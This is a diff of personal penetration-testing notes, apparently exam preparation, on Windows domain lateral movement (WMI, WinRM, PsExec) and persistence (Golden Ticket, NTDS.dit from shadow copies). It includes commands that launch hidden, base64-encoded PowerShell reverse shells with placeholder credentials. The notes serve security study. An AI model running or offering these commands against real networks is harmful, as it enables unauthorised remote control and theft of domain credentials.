@@ -3,7 +3,9 @@ layout: blank
 ---
 
 Lateral movement doesn't have to be used for different subnets. If we have credentials but lack rdp, lateral movement as a domain user is our friend
+
 ### WMI and WinRM
+
 **Windows Management Instrumentation**
 - Facilitates task automation via creating processes
 - Uses Remote Procedure Calls (RPC) over 135 for remote access
@@ -23,6 +25,7 @@ $Command = 'powershell -nop -w hidden -e {reverse_shell_powershell_b64}';
 
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 ```
+
 **WinRM**
 - Communicates over 5986 and 5985 with XML via HTTP/HTTPS
 - Use with `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "cmd /c {command}"` or `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "powershell -nop -w hidden -e {reverse_shell_powershell_base64}"`
@@ -36,6 +39,7 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 New-PSSession -ComputerName {target} -Credential $credential
 Enter-PSSession {PSSession_ID_returned}
 ```
+
 ### PsExec
 - Tool used to replace telnet-like applications and provide remote execution of processes
 - From [PsTools](https://download.sysinternals.com/files/PSTools.zip)
@@ -90,6 +94,7 @@ Enter-PSSession {PSSession_ID_returned}
 
 ### Persistence
 - Not exactly tested by the exam, but shells can be flaky and these can help
+
 **Golden Ticket**
 - Trying to get the KDC's secret key to create self-made tickets for any service on the system
 - Requires full control over the DC or a being part of a Domain Admin group
@@ -103,6 +108,7 @@ Enter-PSSession {PSSession_ID_returned}
 - This will essentially give the domain user Domain Admin privileges
 	- `PsExec.exe \\{domain_controller_dnshostname} powershell`
 		- Can't use the IP of the DC, as that will resort to NTLM
+		
 **Shadow Copies**
 - Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
 - As a domain admin, we can create a shadow copy and extract the NTDS.dit database file
